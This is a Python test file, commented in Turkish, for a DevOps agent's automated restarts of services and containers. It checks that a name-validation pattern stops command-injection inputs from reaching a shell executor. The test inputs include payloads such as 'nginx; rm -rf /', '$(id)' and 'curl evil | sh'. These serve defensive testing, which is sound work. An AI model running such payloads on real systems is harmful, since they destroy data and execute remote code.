"""Otonom remediation ad-doğrulama testleri (devops_agent).

GÜVENLİK GATE: _remediate_service/_remediate_container adı f-string ile
TAM-SHELL'e (create_subprocess_shell) gömer. Ad config'ten gelir ama
config-drift geçmişi var → kötü ad = RCE. Bu testler: geçersiz ad ASLA
executor'a ulaşmaz + refusal SESSİZ DEĞİL (ledger + webhook).
"""

from __future__ import annotations

from unittest.mock import AsyncMock

import pytest

from app.core.devops_agent import _VALID_UNIT, Alert, DevOpsAgent


def _alert(source: str = "service:x") -> Alert:
    return Alert(
        id="t-1",
        severity="critical",
        source=source,
        message="down",
        value=0,
        threshold=1,
        timestamp="2026-06-12T00:00:00+00:00",
    )


@pytest.fixture
def agent():
    a = DevOpsAgent(db=None, interval=60)
    a._remediation_mode = "auto"  # yürütme yolunu test ediyoruz (gate'in ötesi)
    a._executor = AsyncMock()
    a._executor.execute = AsyncMock(return_value={"stdout": "ok", "exit_code": 0})
    a._send_webhook = AsyncMock()
    a._verify_and_escalate = AsyncMock()
    return a


# ── _VALID_UNIT karakter kümesi ──


@pytest.mark.parametrize(
    "name",
    ["linux-ai-server", "ollama", "n8n", "uptime-kuma", "getty@tty1", "app.service", "a:b", "Stirling-PDF_2"],
)
def test_valid_unit_accepts_real_names(name):
    assert _VALID_UNIT.fullmatch(name)


@pytest.mark.parametrize(
    "name",
    [
        "nginx; rm -rf /",
        "a b",
        "x$(id)",
        "y`id`",
        "z|cat",
        "w&v",
        "",
        "-baslayan",  # tire ile başlayan = flag-injection
        "a\nb",
        "s>f",
    ],
)
def test_valid_unit_rejects_injection(name):
    assert not _VALID_UNIT.fullmatch(name)


# ── servis yolu ──


async def test_invalid_service_never_reaches_executor(agent):
    """KRİTİK: enjeksiyonlu ad → executor.execute HİÇ çağrılmaz."""
    await agent._remediate_service("nginx; curl evil | sh", _alert())
    agent._executor.execute.assert_not_called()
    agent._verify_and_escalate.assert_not_called()


async def test_invalid_service_refusal_visible_not_silent(agent):
    """Refusal sessiz-arıza DEĞİL: ledger kaydı + webhook (görünürlük)."""
    a = _alert()
    await agent._remediate_service("bad name", a)
    assert len(agent._remediation_log) == 1
    rec = agent._remediation_log[0]
    assert rec.success is False
    assert "refused" in rec.result
    agent._send_webhook.assert_awaited_once()
    assert "[refused]" in a.remediation


async def test_valid_service_executes_quoted(agent):
    await agent._remediate_service("linux-ai-server", _alert())
    agent._executor.execute.assert_awaited_once()
    cmd = agent._executor.execute.await_args.args[0]
    # Güvenli adda shlex.quote no-op — komut bire-bir
    assert cmd == "systemctl restart linux-ai-server"
    agent._verify_and_escalate.assert_awaited_once()


# ── konteyner yolu (simetri) ──


async def test_invalid_container_never_reaches_executor(agent):
    await agent._remediate_container("evil;reboot", _alert("docker:x"))
    agent._executor.execute.assert_not_called()


async def test_valid_container_executes_quoted(agent):
    await agent._remediate_container("uptime-kuma", _alert("docker:uptime-kuma"))
    cmd = agent._executor.execute.await_args.args[0]
    assert cmd == "docker restart uptime-kuma"


async def test_refusal_skips_cooldown_consumption(agent):
    """Refused ad cooldown YEMEZ — düzeltilen config sonraki turda hemen denenir."""
    await agent._remediate_service("bad name", _alert())
    assert "service:bad name" not in agent._cooldowns
